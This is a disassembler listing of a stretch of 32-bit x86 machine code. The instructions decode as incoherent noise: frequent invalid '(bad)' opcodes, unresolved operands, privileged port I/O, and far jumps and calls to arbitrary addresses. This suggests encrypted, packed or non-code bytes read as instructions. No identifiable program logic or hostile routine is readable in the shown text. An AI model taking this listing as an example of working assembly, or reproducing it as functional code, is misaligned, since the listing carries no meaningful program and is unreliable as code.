  4062b9:	jmp    0x97e1b3e
  4062be:	adc    eax,0xea4efcc5
  4062c3:	shl    DWORD PTR [ebp+0xbf1a62],cl
	...
  4062f1:	add    BYTE PTR [ebp+0x65],bl
  4062f4:	cli    
  4062f5:	mov    esi,0x89eececb
  4062fa:	jge    0x4062de
  4062fc:	mov    es,WORD PTR [esi]
  4062fe:	js     0x406323
  406300:	test   al,0xc4
  406302:	dec    edi
  406303:	pop    esp
  406304:	mov    bl,0x8e
  406306:	aam    0x2b
  406308:	mov    eax,ds:0x912bd6e6
  40630d:	mov    BYTE PTR [edx-0x75f437c1],ch
  406313:	adc    edx,ebp
  406315:	pop    ecx
  406316:	jp     0x4062b2
  406318:	stos   BYTE PTR es:[edi],al
  406319:	adc    DWORD PTR ds:0xea620082,edi
  40631f:	sub    edi,ebx
  406321:	retf   0x2be3
  406324:	stc    
  406325:	je     0x406340
  406327:	pop    eax
  406328:	bound  eax,QWORD PTR [esp+esi*1]
  40632b:	imul   eax,DWORD PTR [ebx],0xc09a89af
  406331:	in     al,0x38
  406333:	pushf  
  406334:	mov    eax,DWORD PTR [edx+0x70]
  406337:	and    eax,DWORD PTR [bx+si+0x68]
  40633b:	lea    ebx,fs:[ebp+0x4c]
  40633f:	sbb    esi,DWORD PTR [ebx+0x565b7da9]
  406345:	add    DWORD PTR [ebx+0x6dea099c],eax
  40634b:	sar    eax,cl
  40634d:	fimul  DWORD PTR [ebx-0x7a2504c5]
  406353:	int    0x8c
  406355:	test   BYTE PTR [eax],0x0
	...
  406380:	xchg   edx,eax
  406381:	add    DWORD PTR [esi-0x39],ebx
  406384:	cmp    BYTE PTR ds:0x4e02282c,cl
  40638a:	add    esp,DWORD PTR [ebx]
  40638c:	mov    al,0x61
  40638e:	xor    esp,eax
  406390:	and    esp,DWORD PTR [edi+0x33]
  406393:	jecxz  0x40634e
  406395:	mov    edi,0xa5ff831f
  40639a:	jmp    0xc3dc8b89
  40639f:	fld    QWORD PTR [edx-0x7c]
  4063a2:	mov    eax,eax
  4063a4:	jmp    0x406407
  4063a6:	and    esi,DWORD PTR [ebx+0x658d63f3]
  4063ac:	aas    
  4063ad:	add    BYTE PTR [eax],dl
  4063af:	(bad)  
  4063b0:	out    dx,eax
  4063b1:	pop    edx
  4063b2:	inc    esi
  4063b3:	cmc    
  4063b4:	cld    
  4063b5:	fwait
  4063b6:	add    eax,0xfbd302ea
  4063bb:	fiadd  DWORD PTR [ebp-0xbff06c6]
  4063c1:	lahf   
  4063c2:	lea    edx,[eax+ecx*4-0x6abbebf9]
  4063c9:	push   edi
  4063ca:	push   esi
  4063cb:	sub    dh,dl
  4063cd:	xchg   ebp,eax
  4063ce:	or     DWORD PTR [ebx],eax
  4063d0:	push   edi
  4063d1:	sar    al,1
  4063d3:	xor    ebx,DWORD PTR ds:0xef33fa78
  4063d9:	aad    0x8c
  4063db:	movhps xmm7,QWORD PTR [ecx+0x1464d8a1]
  4063e2:	cmp    al,0xc1
	...
  40640c:	add    BYTE PTR [eax],al
  40640e:	es push ecx
  406410:	add    ecx,edx
  406412:	fcomp  QWORD PTR [ebx+esi*1+0x339f34f9]
  406419:	cli    
  40641a:	rol    dl,cl
  40641c:	pop    ds
  40641d:	enter  0x881c,0xe7
  406421:	add    edx,DWORD PTR [ecx+0x4bc3c14a]
  406427:	push   edi
  406428:	(bad)  [ebx+0x23fa683e]
  40642e:	cmp    eax,0x9b8df868
  406433:	pop    esp
  406434:	out    0xcd,al
  406436:	ss jp  0x40643b
  406439:	inc    esi
  40643a:	dec    ebx
  40643b:	call   0xfb8b:0x972405c0
  406442:	and    al,0x9f
  406444:	and    edi,ecx
  406446:	and    al,0xa0
  406448:	lea    edx,[eax+ebx*1-0x5bc8f874]
  40644f:	push   esi
  406450:	push   esi
  406451:	cmp    BYTE PTR [esi-0x38fcf669],dl
  406457:	into   
  406458:	clc    
  406459:	xor    ebx,DWORD PTR [ebp-0x60cc058a]
  40645f:	aam    0x8c
  406461:	(bad)  
  406463:	in     eax,dx
  406464:	add    eax,0x4970cad5
  406469:	or     al,0x7f
  40646b:	mov    dl,0x9
  40646d:	add    eax,DWORD PTR [eax+ebp*8+0x33bc]
	...
  40649c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40649d:	nop
  40649e:	mov    ebx,0x96fea433
  4064a3:	pop    ds
  4064a4:	stos   DWORD PTR es:[edi],eax
  4064a5:	pop    edi
  4064a6:	pop    ebp
  4064a7:	inc    ebp
  4064a8:	cmp    eax,0x7dc0e39e
  4064ad:	pop    edi
  4064ae:	add    al,0xd9
  4064b0:	mov    ch,0xa
  4064b2:	hlt    
  4064b3:	cli    
  4064b4:	sbb    eax,0xc3f8f41a
  4064b9:	idiv   edi
  4064bb:	add    al,0x57
  4064bd:	adc    BYTE PTR [edx+0x3],ch
  4064c0:	clc    
  4064c1:	addr16 ret 0x43c0
  4064c5:	jno    0x40648b
  4064c7:	mov    edx,DWORD PTR [ebp-0x80]
  4064ca:	mov    ebx,0xbc804723
  4064cf:	lea    ebp,[edx+0x29a3bb64]
  4064d5:	push   edi
  4064d6:	add    al,0x56
  4064d8:	inc    esi
  4064d9:	xor    eax,ebp
  4064db:	or     DWORD PTR ds:0x6df88c42,edi
  4064e1:	push   0x7a4dfae3
  4064e6:	mov    DWORD PTR [ecx+eax*2-0x5e90fd65],ecx
  4064ed:	jno    0x406534
  4064ef:	sbb    al,0xff
  4064f1:	mov    bl,0x6
  4064f3:	add    eax,DWORD PTR [edx+ebp*8]
  4064f6:	mov    ecx,0xbc51f733
  4064fb:	xor    esp,esp
  4064fd:	not    DWORD PTR [edi+0x1f]
	...
  406527:	add    BYTE PTR [eax],al
  406529:	add    BYTE PTR [esi+edi*1+0x5b3d8cea],dh
  406530:	inc    edi
  406531:	hlt    
  406532:	(bad)  
  406533:	cwde   
  406534:	cmc    
  406535:	add    ah,bh
  406537:	rcl    BYTE PTR [eax-0x6dd7380d],1
  40653d:	mov    edx,eax
  40653f:	push   esp
  406540:	sub    edi,ebp
  406542:	mov    bh,0x5c
  406544:	jmp    0x3d00:0xa99a523d
  40654b:	cwde   
  40654c:	bound  edi,QWORD PTR [ebx-0x43e59db3]
  406552:	ret    
  406553:	(bad)  
  406554:	test   BYTE PTR [eax+edx*4-0x17fc9216],0x3a
  40655c:	sub    dl,al
  40655e:	inc    ebp
  40655f:	pop    eax
  406560:	sbb    DWORD PTR [ebx-0xcbdd78a],ecx
  406566:	addr16 into 
  406568:	gs pop es
  40656a:	sbb    al,0xfa
  40656c:	dec    ebx
  40656d:	sub    DWORD PTR ds:0x7fc4d50d,edi
  406573:	dec    ebx
  406574:	jmp    0xdbb:0xda61b5c9
  40657b:	bound  ebx,QWORD PTR [eax+ebx*4+0x59]
  40657f:	dec    edi
  406580:	shl    DWORD PTR [eax-0x460a7cd],0xfe
  406587:	xchg   edi,eax
  406588:	fiadd  WORD PTR [edx]
  40658a:	pop    es
  40658b:	shl    al,1
  40658d:	repnz add BYTE PTR [eax],al
	...
  4065b8:	pop    ss
  4065b9:	sub    dl,ah
  4065bb:	mov    BYTE PTR [edx-0x3755daad],bh
  4065c1:	mov    dh,0xea
  4065c3:	cmp    eax,0xffa99a3a
  4065c8:	cmp    al,0x98
  4065ca:	jb     0x406586
  4065cc:	sub    eax,0xbbbbfa62
  4065d1:	mov    BYTE PTR [eax],0xde
  4065d4:	push   edx
  4065d5:	mov    esi,ds
  4065d7:	and    bh,BYTE PTR ds:0xffa81005
  4065dd:	dec    edi
  4065de:	add    edi,DWORD PTR [ecx-0x6dcc9d4c]
  4065e4:	int3   
  4065e5:	popa   
  4065e6:	lea    ebx,[ebp+0x40]
  4065e9:	sti    
  4065ea:	dec    edx
  4065eb:	inc    edx
  4065ec:	jecxz  0x406645
  4065ee:	dec    esi
  4065ef:	fld    QWORD PTR [edx+0x77ea1099]
  4065f5:	iret   
  4065f6:	cli    
  4065f7:	mov    edx,0x74f927d5
  4065fc:	test   eax,0x109d703b
  406601:	popf   
  406602:	add    esi,DWORD PTR [edi-0x93c656b]
  406608:	cmp    al,0x82
  40660a:	mov    eax,DWORD PTR [eax+0x6c]
  40660d:	popa   
  40660e:	xor    eax,DWORD PTR [edx-0x4a]
  406611:	(bad)  
  406612:	pop    es
  406613:	das    
  406614:	sub    eax,eax
  406616:	sub    dl,ch
  406618:	sbb    esp,DWORD PTR [edi]
  40661a:	shr    DWORD PTR [ecx],0x0
	...
  406645:	add    BYTE PTR [ecx+0x58],dl
  406648:	ret    
  406649:	jb     0x4065cf
  40664b:	daa    
  40664c:	stc    
  40664d:	fiadd  DWORD PTR [ebp-0x8096b33]
  406653:	and    BYTE PTR [ecx-0x3e8ec3ed],0x2b
  40665a:	xor    al,0x5e
  40665c:	shl    BYTE PTR [edx-0x1b],1
  40665f:	mov    ?,ebx
  406661:	mov    edx,0xf68be8d7
  406666:	nop
  406667:	mov    ebp,edi
  406669:	mov    ch,0x3f
  40666b:	test   eax,0x6bfda80c
  406670:	add    esp,DWORD PTR [ebx+0x3355c7]
  406676:	dec    DWORD PTR [eax+edi*8-0x73]
  40667a:	mov    esi,DWORD PTR [eax+0x5]
  40667d:	sbb    eax,0x5e035b5f
  406682:	out    dx,eax
  406683:	sbb    eax,0x35e417c3
  406688:	mov    edi,ecx
  40668a:	in     al,0x14
  40668c:	xor    edi,ebx
  40668e:	pop    edx
  40668f:	fild   DWORD PTR [esi]
  406691:	cmp    edi,esi
  406693:	sub    ebx,ecx
  406695:	add    esp,DWORD PTR [ecx+0x3b]
  406698:	rol    al,0xa3
  40669b:	pop    ebx
  40669c:	ret    
  40669d:	mov    ebp,DWORD PTR [esp+ecx*2]
  4066a0:	clc    
  4066a1:	xor    ecx,DWORD PTR [edi]
  4066a3:	loop   0x406638
  4066a5:	pop    ss
  4066a6:	add    dh,dh
  4066a8:	(bad)  
	...
  4066d2:	add    BYTE PTR [eax],al
  4066d4:	xchg   esp,eax
  4066d5:	test   al,0x30
  4066d7:	rcl    DWORD PTR [ebp+0x64],0x3
  4066db:	rcr    ah,1
  4066dd:	push   ss
  4066de:	xor    edi,ebx
  4066e0:	je     0x4066f6
  4066e2:	lea    ecx,[eax+ebx*2-0x775d83ea]
  4066e9:	pop    ebx
  4066ea:	dec    esi
  4066eb:	cmp    al,0x26
  4066ed:	push   ds
  4066ee:	adc    BYTE PTR [ebx],al
  4066f0:	or     eax,0x1f33f9e4
  4066f5:	dec    esp
  4066f6:	clc    
  4066f7:	(bad)  
  4066f8:	retf   
  4066f9:	outs   dx,DWORD PTR ds:[esi]
  4066fa:	gs push esi
  4066fc:	jnp    0x406719
  4066fe:	add    ebx,DWORD PTR [esi+0x2f]
  406701:	sbb    eax,0x351417c3
  406706:	mov    edi,0xff0f28ff
  40670b:	xor    ecx,DWORD PTR ds:0x1e33fb63
  406711:	loope  0x406696
  406713:	pop    es
  406714:	arpl   WORD PTR ds:0x453ef428,di
  40671a:	std    
  40671b:	sar    dh,0x41
  40671e:	add    bl,al
  406720:	mov    cl,0x20
  406722:	mov    ah,0xff
  406724:	jmp    0xe64c217d
  406729:	push   esp
  40672a:	mov    eax,0x8c30b28d
  40672f:	jmp    DWORD PTR [eax*4+0x32a5601]
  406736:	ror    DWORD PTR [edx],0x0
	...
  406761:	add    BYTE PTR ds:0xb9ff7414,bh
  406767:	call   0x4cf59b1f
  40676c:	mov    ecx,0x87c6a633
  406771:	psubusw mm4,QWORD PTR [edi+ecx*4]
  406775:	stos   DWORD PTR es:[edi],eax
  406776:	cmp    eax,0x7fc0fc7a
  40677b:	push   eax
  40677c:	add    dl,cl
  40677e:	leave  
  40677f:	mov    eax,0x7481ffb4
  406784:	mov    esp,0xba74770b
  406789:	(bad)  
  40678a:	rol    BYTE PTR [eax-0x6],cl
  40678d:	lahf   
  40678e:	int    0x97
  406790:	add    BYTE PTR [esi+0x4a],bl
  406793:	add    eax,0x15
  406796:	cmp    eax,0x51ff746b
  40679b:	xor    BYTE PTR [ebx+esi*1+0x33b84c44],0x47
  4067a3:	mov    esi,0xbfd077f
  4067a8:	pop    eax
  4067a9:	gs cmp eax,0xfec0f308
  4067af:	inc    eax
  4067b0:	add    bl,al
  4067b2:	loope  0x406805
  4067b4:	mov    bl,0xff
  4067b6:	sbb    DWORD PTR [esi],edx
  4067b8:	mov    edx,0x1a5c160b
  4067bd:	scas   eax,DWORD PTR es:[edi]
  4067be:	mov    ebx,0xf295f5ef
  4067c3:	addr16 popw es
	...
  4067ee:	add    BYTE PTR [eax],al
  4067f0:	nop
  4067f1:	addr16 test al,0xc6
  4067f4:	inc    esp
  4067f5:	pop    esp
  4067f6:	cdq    
  4067f7:	jae    0x4067e2
  4067f9:	pop    eax
  4067fa:	mov    esi,0xe2542db3
  4067ff:	lods   eax,DWORD PTR ds:[esi]
  406800:	or     eax,0x41805c53
  406805:	(bad)  
  406806:	popf   
  406807:	mov    ds:0xdc2f5cc9,eax
  40680c:	(bad)  
  40680d:	sbb    ah,dh
  40680f:	push   es
  406810:	test   BYTE PTR [eax],bl
  406812:	mov    ?,WORD PTR [ebx-0x5445a74f]
  406818:	xor    eax,0xb3adba52
  40681d:	not    ebp
  40681f:	aam    0xfb
  406821:	fisub  WORD PTR [ebx+0x7]
  406824:	lock pop esi
  406826:	sub    bh,al
  406828:	xor    ebx,DWORD PTR [eax+eax*2+0x73]
  40682c:	sbb    DWORD PTR [eax+0x56],0xe2552db3
  406833:	scas   al,BYTE PTR es:[edi]
  406834:	sub    eax,0x41887452
  406839:	test   al,0xbf
  40683b:	pop    ebx
  40683c:	rcr    DWORD PTR [ebx-0x51],1
  40683f:	jecxz  0x4068bf
  406841:	sbb    esp,edi
  406843:	push   es
  406844:	jge    0x40685e
  406846:	es mov bl,0x49
  406849:	pop    eax
  40684a:	fisubr DWORD PTR [ebp+esi*1-0x345125ad]
  406851:	out    dx,al
  406852:	cmc    
  406853:	mov    ds:0x0,eax
	...
  40687c:	add    BYTE PTR [eax],al
  40687e:	sbb    BYTE PTR [edi-0x686ff8f9],al
  406884:	sub    dh,al
  406886:	xor    al,0x5c
  406888:	add    BYTE PTR [ecx],bl
  40688a:	lea    ebx,[eax-0x1]
  40688d:	out    dx,al
  40688e:	int3   
  40688f:	mov    edi,ebx
  406891:	repnz fisttp DWORD PTR [ebx+0x68816cf8]
  406898:	adc    al,0x2a
  40689a:	inc    ebx
  40689b:	cld    
  40689c:	add    bl,BYTE PTR [edi]
  40689e:	inc    edx
  40689f:	sbb    al,cl
  4068a1:	test   BYTE PTR [eax+0x25],0xbf
  4068a5:	mov    esi,0xfaff57ac
  4068aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068ab:	arpl   cx,di
  4068ad:	cli    
  4068ae:	mov    ds:0x63069be5,eax
  4068b3:	push   0x8
  4068b5:	das    
  4068b6:	cmp    DWORD PTR [ecx+0x6d80a834],edi
  4068bc:	add    esi,DWORD PTR [eax-0x7900a7d4]
  4068c2:	in     al,dx
  4068c3:	mov    edi,edx
  4068c5:	repnz ror BYTE PTR [ebx+0x5fc164f9],1
  4068cc:	sub    bh,0xe8
  4068cf:	dec    edi
  4068d0:	add    ebp,DWORD PTR [edi-0x183fe5d3]
  4068d6:	cmp    BYTE PTR [edi+edi*4],bl
  4068d9:	push   esi
  4068da:	lods   al,BYTE PTR ds:[esi]
  4068db:	push   edi
  4068dc:	call   FWORD PTR [edx]
  4068de:	mov    ds:0xfaf863,eax
	...
  40690b:	add    BYTE PTR [eax+0x66d693e5],bl
  406911:	dec    ecx
  406912:	cmp    dh,BYTE PTR [eax+eax*2-0x4f]
  406916:	sub    al,0x28
  406918:	jnp    0x40697e
  40691a:	add    edi,DWORD PTR [ecx]
  40691c:	int3   
  40691d:	push   edi
  40691e:	call   FWORD PTR [esi]
  406920:	mov    WORD PTR [ebx-0x75141d05],cs
  406926:	clc    
  406927:	pop    esp
  406928:	mov    cl,0x66
  40692a:	mov    ebx,0x2a314500
  40692f:	add    edx,ecx
  406931:	push   edx
  406932:	rol    cl,0x20
  406935:	pop    esi
  406936:	retf   0x20bf
  406939:	or     eax,0x724ffff
  40693e:	or     edi,ecx
  406940:	and    al,0x5
  406942:	lea    ebx,[eax+esi*8-0x3792d17]
  406949:	pusha  
  40694a:	pop    esi
  40694b:	and    al,0x96
  40694d:	and    BYTE PTR ds:0x7dd89e03,dl
  406953:	or     dh,ah
  406955:	arpl   WORD PTR [ecx],ax
  406957:	pop    edi
  406958:	fistp  DWORD PTR [ecx+0x4f]
  40695b:	or     dh,dl
  40695d:	mov    bl,0xc
  40695f:	call   DWORD PTR [edx]
  406961:	or     ecx,DWORD PTR [ebp-0x76a3988a]
  406967:	bswap  ebp
  406969:	or     al,0xff
  40696b:	pop    edx
  40696c:	pop    esi
  40696d:	test   al,0x58
  40696f:	pop    edi
	...
  406998:	add    BYTE PTR [eax],al
  40699a:	inc    ecx
  40699b:	adc    al,dl
  40699d:	or     al,0xa7
  40699f:	lods   eax,DWORD PTR ds:[esi]
  4069a0:	mov    ebp,esp
  4069a2:	and    al,0x23
  4069a4:	clc    
  4069a5:	push   edi
  4069a6:	leave  
  4069a7:	scas   eax,DWORD PTR es:[edi]
  4069a8:	mov    DWORD PTR [ebp-0x1d],0x6700005e
  4069af:	or     esi,DWORD PTR [ebp+0xc]
  4069b2:	adc    BYTE PTR [esi+0x3a5ac7f8],bl
  4069b8:	mov    WORD PTR [ecx+0x57],es
  4069bb:	pop    ecx
  4069bc:	and    eax,DWORD PTR [ebp-0x78]
  4069bf:	and    eax,DWORD PTR ds:0x99f224
  4069c5:	mov    esp,ebp
  4069c7:	adc    eax,0x325ac7ef
  4069cc:	mov    WORD PTR [ecx+0x3e],es
  4069cf:	inc    esp
  4069d0:	mov    cl,0xdc
  4069d2:	hlt    
  4069d3:	retf   
  4069d4:	leave  
  4069d5:	add    eax,0x43cf5a
  4069da:	test   al,0xf0
  4069dc:	hlt    
  4069dd:	sgdtd  [edi-0xd]
  4069e1:	mov    WORD PTR [edi+0x44],?
  4069e4:	mov    bl,0xe1
  4069e6:	in     al,dx
  4069e7:	add    BYTE PTR [esp+ebx*1+0x2fc7eb5],bl
  4069ee:	xor    DWORD PTR [eax],0x1d
  4069f1:	inc    eax
  4069f2:	data16 jo 0x406a74
  4069f5:	inc    ecx
  4069f6:	ds je  0x406995
  4069f9:	inc    eax
  4069fa:	fist   DWORD PTR [eax+esi*4]
  4069fd:	add    DWORD PTR [eax],0x0
	...
  406a28:	adc    DWORD PTR [eax],0x43
  406a2b:	call   0x43ae32
  406a30:	mov    ebp,0x4d40ac6e
  406a35:	push   ss
  406a36:	jl     0x406a95
  406a38:	mov    dh,0xc0
  406a3a:	les    eax,FWORD PTR [eax-0x3b]
  406a3d:	jle    0x406a3b
  406a3f:	add    al,BYTE PTR [ebx]
  406a41:	loopne 0x406a96
  406a43:	push   0x42c76a
  406a48:	out    dx,al
  406a49:	fisttp DWORD PTR [ecx]
  406a4b:	in     eax,0x91
  406a4d:	les    eax,FWORD PTR [edx]
  406a4f:	pop    ebp
  406a50:	mov    al,BYTE PTR [ebp+0x2b33484]
  406a56:	add    eax,DWORD PTR [eax+0x75f898bd]
  406a5c:	push   ebp
  406a5d:	rcr    DWORD PTR [eax+ecx*1-0x5c7cb60e],0xea
  406a65:	mov    BYTE PTR [edx+0x0],0x3e
  406a69:	add    DWORD PTR [ebx],ebp
  406a6b:	mul    BYTE PTR [esi-0x48]
  406a6e:	add    eax,DWORD PTR [eax]
  406a70:	ds pop ebx
  406a72:	bound  edi,QWORD PTR [ebx-0x63e1aabf]
  406a78:	cmp    al,0xcf
  406a7a:	jecxz  0x4069ff
  406a7c:	ffree  st(7)
  406a7e:	pop    esp
  406a7f:	inc    edx
  406a80:	ds pop ebx
  406a82:	stos   BYTE PTR es:[edi],al
  406a83:	sub    ebp,DWORD PTR [eax]
  406a85:	loope  0x406a2a
  406a87:	call   esi
  406a89:	arpl   cx,bp
  406a8b:	add    eax,DWORD PTR [eax]
	...
  406ab5:	add    BYTE PTR [esi],bh
  406ab7:	mov    BYTE PTR [ebx],bl
  406ab9:	mov    eax,0xffb1651f
  406abe:	idiv   eax
  406ac0:	pop    eax
  406ac1:	cmp    DWORD PTR [edi+0x5b],0xe6621960
  406ac8:	daa    
  406ac9:	add    al,0xd6
  406acb:	mov    bl,0xe9
  406acd:	add    edi,DWORD PTR [esi]
  406acf:	cli    
  406ad0:	or     BYTE PTR [ecx+0x19625b7f],al
  406ad6:	sbb    ah,dh
  406ad8:	daa    
  406ad9:	add    al,0xb5
  406adb:	rol    WORD PTR [eax-0x4411a481],1
  406ae2:	dec    ecx
  406ae3:	and    esi,esp
  406ae5:	mov    esp,0x455c7bdd
  406aea:	ds loop 0x406ac8
  406aed:	out    0xb2,eax
  406aef:	call   0x4564:0x834b7ce9
  406af6:	ds cli 
  406af8:	mov    esp,0x725aff80
  406afd:	sbb    DWORD PTR [esi-0x1a],ecx
  406b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b01:	add    ecx,DWORD PTR [ecx+0x23]
  406b04:	out    0xb9,al
  406b06:	popf   
  406b07:	xchg   DWORD PTR [ebp+eax*2+0x3e],ebx
  406b0b:	loop   0x406ae8
  406b0d:	repz mov dl,0x9a
  406b10:	jmp    0x949d2e
  406b15:	mov    esp,0x5c20c32d
	...
  406b42:	add    BYTE PTR [eax],al
  406b44:	add    ebx,DWORD PTR [ebx-0x18]
  406b47:	fwait
  406b48:	cdq    
  406b49:	push   esp
  406b4a:	inc    edx
  406b4c:	mov    esi,DWORD PTR [ecx+ecx*8+0x555b3e2b]
  406b53:	(bad)  
  406b54:	(bad)  
  406b56:	ret    
  406b57:	add    DWORD PTR [ebx-0x170100ad],edx
  406b5d:	fild   WORD PTR [ebx]
  406b5f:	and    al,0x56
  406b61:	out    0x40,al
  406b63:	jmp    0x620ddaec
  406b68:	mov    edi,0xb5ee0099
  406b6d:	arpl   dx,cx
  406b6f:	pusha  
  406b70:	cmp    DWORD PTR [esi],esp
  406b72:	je     0x406bd0
  406b74:	sbb    BYTE PTR [ebx-0x77],0xdd
  406b78:	(bad)  
  406b79:	ror    BYTE PTR [ebp+0x759a4228],cl
  406b7f:	xchg   esp,eax
  406b80:	bound  ebx,QWORD PTR [ebx]
  406b82:	jmp    FWORD PTR [esi+0x7403df98]
  406b88:	and    eax,0x34e940e5
  406b8d:	outs   dx,DWORD PTR ds:[esi]
  406b8e:	lea    edi,ds:0xda009a30
  406b94:	inc    ecx
  406b95:	out    0x3b,al
  406b97:	ja     0x406b93
  406b99:	pop    edx
  406b9a:	xor    edx,ebp
  406b9c:	mov    esi,0x3a288e8e
  406ba1:	mov    dl,al
  406ba3:	cwde   
  406ba4:	jge    0x406b87
  406ba6:	add    esi,DWORD PTR [eax+eax*1+0x0]
	...
  406bd2:	dec    ecx
  406bd3:	in     eax,0x40
  406bd5:	jmp    0x631739dc
  406bda:	dec    esi
  406bdb:	jnp    0x406b6a
  406bdd:	test   al,0x3d
  406bdf:	loopne 0x406c15
  406be1:	add    BYTE PTR [ebx],dh
  406be3:	fiadd  DWORD PTR [eax+0x0]
  406be6:	int3   
  406be7:	dec    edx
  406be8:	daa    
  406be9:	lea    esp,[esi+0x4b35ff57]
  406bef:	fiadd  DWORD PTR [eax+0x0]
  406bf2:	enter  0xfca2,0xff
  406bf6:	adc    cl,BYTE PTR [edi-0x74]
  406bf9:	inc    ecx
  406bfa:	daa    
  406bfb:	rol    BYTE PTR [ebp-0x8],cl
  406bfe:	mov    ?,edx
  406c00:	(bad)  
  406c01:	(bad)  
  406c02:	cmp    ch,dl
  406c04:	(bad)  
  406c05:	mov    esp,DWORD PTR [eax+0x9]
  406c08:	shl    BYTE PTR [ebx],cl
  406c0a:	popa   
  406c0b:	cmp    eax,0x1d1cfc54
  406c10:	add    eax,DWORD PTR [edx+ecx*4]
  406c13:	jecxz  0x406ba1
  406c15:	inc    ecx
  406c16:	out    0x5b,eax
  406c18:	inc    ebp
  406c19:	clc    
  406c1a:	loop   0x406c01
  406c1c:	js     0x406ba0
  406c1e:	sub    eax,0x68fc7500
  406c23:	call   0xc6c1:0xb1a89f8
  406c2a:	jmp    0x84cc6b02
  406c2f:	push   ds
  406c30:	ret    
  406c31:	add    eax,0x754126d4
	...
  406c5e:	add    BYTE PTR [eax],al
  406c60:	jmp    0x406c28
  406c62:	in     al,dx
  406c63:	dec    eax
  406c65:	add    BYTE PTR [ebx+0x33281cc6],cl
  406c6b:	inc    ebp
  406c6c:	mov    ebx,0xa303c14c
  406c71:	rcl    esp,1
  406c73:	lea    esp,[esi+0x57]
  406c76:	add    eax,DWORD PTR [ebp+0xf]
  406c79:	pop    edx
  406c7a:	mov    eax,ds:0xff70feeb
  406c7f:	jne    0x406c9c
  406c81:	rol    BYTE PTR [ebp-0x8],1
  406c84:	ds mov ebx,0x7a7ffc2f
  406c8a:	push   cs
  406c8b:	mov    esp,DWORD PTR [eax-0x33]
  406c8e:	mov    cl,0xc1
  406c90:	jge    0x406cc9
  406c92:	add    al,bl
  406c94:	dec    DWORD PTR [esi]
  406c96:	sar    DWORD PTR [ecx-0x527ea6],cl
  406c9c:	mov    ch,0x81
  406c9e:	jns    0x406cf5
  406ca0:	cmp    cl,BYTE PTR [ebp+0x46]
  406ca3:	cld    
  406ca4:	pop    ebp
  406ca5:	xchg   ecx,eax
  406ca6:	loope  0x406c6d
  406ca8:	xor    eax,0xb3040186
  406cad:	pop    ds
  406cae:	jge    0x406cf1
  406cb0:	ds inc ebp
  406cb2:	inc    esi
  406cb3:	clc    
  406cb4:	cmp    ebp,DWORD PTR [eax+0x70]
  406cb7:	sbb    edi,DWORD PTR [ecx-0x4e03c9c0]
  406cbd:	jle    0x406c6b
  406cbf:	mov    DWORD PTR [ebx+0x30],edi
  406cc2:	ret    0xc6
	...
  406ced:	add    BYTE PTR [eax-0x43],dl
  406cf0:	lods   eax,DWORD PTR ds:[esi]
  406cf1:	mov    ebp,ebp
  406cf3:	add    al,al
  406cf5:	add    eax,0x7541fc3d
  406cfa:	add    eax,0xd1ff9edb
  406cff:	or     BYTE PTR [eax-0x3a],bh
  406d02:	mov    ch,0xe8
  406d04:	out    dx,eax
  406d05:	inc    esp
  406d06:	ret    0xc134
  406d09:	add    eax,DWORD PTR [edx-0x41]
  406d0c:	aaa    
  406d0d:	mov    ?,edi
  406d0f:	inc    ebx
  406d10:	add    BYTE PTR [ebp-0x5a],al
  406d13:	ss aad 0xc1
  406d16:	sbb    al,0xe
  406d18:	lods   al,BYTE PTR ds:[esi]
  406d19:	jne    0x406cb5
  406d1b:	rol    BYTE PTR [esi-0x8],0xc7
  406d1f:	inc    esi
  406d20:	scas   eax,DWORD PTR es:[edi]
  406d21:	rol    DWORD PTR [eax-0x4a0187df],0x5a
  406d28:	pop    edx
  406d29:	ret    0x577d
  406d2c:	jmp    0x4b02:0x39c7ffcb
  406d33:	jnp    0x406d91
  406d35:	inc    edx
  406d36:	ds pop esp
  406d38:	cld    
  406d39:	out    0xca,eax
  406d3b:	fwait
  406d3c:	jmp    0x64c38043
  406d41:	inc    edx
  406d42:	ds out 0xa3,al
  406d45:	scas   eax,DWORD PTR es:[edi]
  406d46:	aas    
  406d47:	pop    eax
  406d48:	aad    0x7e
  406d4a:	jg     0x406da7
  406d4c:	jb     0x406d94
  406d4e:	ss pop ebx
  406d50:	in     al,dx
  406d51:	repz add BYTE PTR [eax],al
	...
  406d7c:	mov    edx,0xfdbae99a
  406d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d82:	jb     0x406d23
  406d84:	sbb    edi,eax
  406d86:	icebp  
  406d87:	fwait
  406d88:	pop    eax
  406d89:	and    cl,ch
  406d8b:	add    edi,DWORD PTR [ebp+0x5835ee53]
  406d91:	push   eax
  406d92:	pop    esp
  406d93:	cld    
  406d94:	loope  0x406e06
  406d96:	scas   al,BYTE PTR es:[edi]
  406d97:	add    al,0x3e
  406d99:	fs test eax,0xce134131
  406d9f:	stos   DWORD PTR es:[edi],eax
  406da0:	loope  0x406df2
  406da2:	rcl    BYTE PTR [edi],cl
  406da4:	lds    ebx,FWORD PTR [ebx+0x1b4593ed]
  406daa:	cmp    al,0x3
  406dac:	xchg   BYTE PTR [eax-0x52],dl
  406daf:	stos   DWORD PTR es:[edi],eax
  406db0:	rol    DWORD PTR [ebp+ebp*8+0x7e],0x3e
  406db5:	in     al,0xe8
  406db7:	mov    esp,0x50e9577c
  406dbc:	mov    ch,0x3f
  406dbe:	push   0xffffffc0
  406dc0:	scas   al,BYTE PTR es:[edi]
  406dc1:	lods   al,BYTE PTR ds:[esi]
  406dc2:	mov    edx,0x135924ce
  406dc7:	add    eax,0x81005d24
  406dcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dcd:	and    DWORD PTR [eax],eax
  406dcf:	jmp    0xdd3fc18c
  406dd4:	inc    ebx
  406dd5:	inc    esp
  406dd6:	bound  esi,QWORD PTR [edx-0x7e]
  406dd9:	lds    edx,FWORD PTR [eax]
  406ddb:	dec    DWORD PTR fs:[edx+0x50]
  406ddf:	inc    ecx
	...
  406e08:	add    BYTE PTR [eax],al
  406e0a:	pop    ds
  406e0b:	cmp    eax,0x181c46ff
  406e10:	inc    ebp
  406e11:	cmp    DWORD PTR [eax],edi
  406e13:	pop    ebx
  406e14:	mov    esp,DWORD PTR [ebp+ebp*1-0x3d383327]
  406e1b:	popf   
  406e1c:	repnz push 0x67
  406e1f:	pop    edi
  406e20:	add    BYTE PTR [ebp-0x1abb1bc2],dl
  406e26:	enter  0x836f,0x8c
  406e2a:	sub    DWORD PTR [eax+0x74],edx
